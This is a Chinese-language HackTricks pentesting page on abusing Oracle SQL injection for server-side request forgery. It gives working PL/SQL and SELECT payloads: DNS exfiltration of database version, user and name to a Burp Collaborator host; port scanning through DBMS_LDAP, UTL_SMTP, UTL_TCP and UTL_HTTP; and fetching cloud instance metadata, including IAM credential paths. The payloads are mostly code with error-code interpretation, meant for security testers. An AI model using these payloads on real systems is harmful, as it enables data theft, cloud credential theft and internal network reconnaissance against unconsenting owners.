# Oracle注入

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## SSRF

使用Oracle进行带外HTTP和DNS请求的方法已经有很多文档，但作为注入中泄露SQL数据的手段。我们总是可以修改这些技术/函数来进行其他SSRF/XSPA。

安装Oracle可能非常痛苦，特别是如果你想快速设置一个实例来尝试命令。我的朋友和[Appsecco](https://appsecco.com)的同事[Abhisek Datta](https://github.com/abhisek)向我指出了[https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c)，它允许我在t2.large AWS Ubuntu机器和Docker上设置一个实例。

我使用`--network="host"`标志运行了docker命令，这样我就可以模拟Oracle作为本地安装，并具有完全的网络访问权限，用于本篇博文的过程中。
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### 支持URL或主机名/端口号规范的Oracle包 <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

为了找到支持主机和端口规范的任何包和函数，我在[Oracle数据库在线文档](https://docs.oracle.com/database/121/index.html)上进行了谷歌搜索。具体来说，
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
搜索返回了以下结果（并非所有结果都可用于执行出站网络操作）

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

这个简单的搜索显然跳过了像`DBMS_LDAP`（允许传递主机名和端口号）这样的包，因为[文档页面](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360)只是将您指向[不同的位置](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360)。因此，可能还有其他可以滥用的Oracle包，用于进行出站请求，我可能忽略了。

无论如何，让我们来看看我们发现并列出的一些包。

**DBMS\_LDAP.INIT**

`DBMS_LDAP`包允许访问LDAP服务器上的数据。`init()`函数用于初始化与LDAP服务器的会话，并以主机名和端口号作为参数。

此函数以前已经记录过，用于显示通过DNS泄露数据，如下所示
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
然而，鉴于该函数接受主机名和端口号作为参数，您也可以将其用作端口扫描器。

以下是一些示例：
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/18.png)

一个 `ORA-31203: DBMS_LDAP: PL/SQL - 初始化失败` 表明端口关闭，而会话值指向端口开放。

**UTL\_SMTP**

`UTL_SMTP` 包是用于通过 SMTP 发送电子邮件的。在 [Oracle 文档网站上提供的示例展示了如何使用该包发送电子邮件](https://docs.oracle.com/database/121/ARPLS/u\_smtp.htm#ARPLS71478)。然而，对我们来说，有趣的是能够提供主机和端口规范的能力。

下面是一个简单的示例，使用 `UTL_SMTP.OPEN_CONNECTION` 函数，超时设置为 2 秒。
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/19.png)

一个 `ORA-29276: transfer timeout` 错误表示端口是打开的，但没有建立 SMTP 连接，而 `ORA-29278: SMTP transient error: 421 Service not available` 错误表示端口是关闭的。

**UTL\_TCP**

`UTL_TCP` 包及其过程和函数允许与基于 TCP/IP 的服务进行通信。如果为特定服务编程，该包可以轻松成为进入网络或执行完整的服务器端请求的途径，因为可以控制 TCP/IP 连接的所有方面。

在 Oracle 文档网站上的示例显示了如何使用此包建立原始的 TCP 连接以获取网页。我们可以简化它，并使用它来对元数据实例或任意 TCP/IP 服务进行请求。
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/20.png)
```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/21.png)

有趣的是，由于能够构造原始的TCP请求，这个包也可以用于查询所有云提供商的实例元数据服务，因为方法类型和附加的头信息都可以在TCP请求中传递。

**UTL\_HTTP和Web请求**

也许在每个关于Oracle SQL注入的教程中最常见和广泛记录的技术是[`UTL_HTTP`包](https://docs.oracle.com/database/121/ARPLS/u\_http.htm#ARPLS070)。根据文档的定义，该包是 - `UTL_HTTP包从SQL和PL/SQL中进行超文本传输协议（HTTP）调用。您可以使用它通过HTTP访问互联网上的数据。`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/16.png)

此外，您还可以使用以下查询执行一些基本的端口扫描：
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/17.png)

一个 `ORA-12541: TNS:no listener` 或者 `TNS:operation timed out` 的错误表示 TCP 端口关闭，而 `ORA-29263: HTTP protocol error` 或者数据表示端口打开。

我过去使用过的另一个包是 [`HTTPURITYPE` Oracle 抽象类型的 `GETCLOB()` 方法](https://docs.oracle.com/database/121/ARPLS/t\_dburi.htm#ARPLS71705)，它允许您与 URL 进行交互，并提供对 HTTP 协议的支持。`GETCLOB()` 方法用于将 URL 的 GET 响应作为 [CLOB 数据类型](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html) 获取。[select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/22.png)](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家 **网络安全公司** 工作吗？你想在 HackTricks 中看到你的 **公司广告** 吗？或者你想获得 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram 群组**](https://t.me/peass) 或者 **关注** 我的 **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
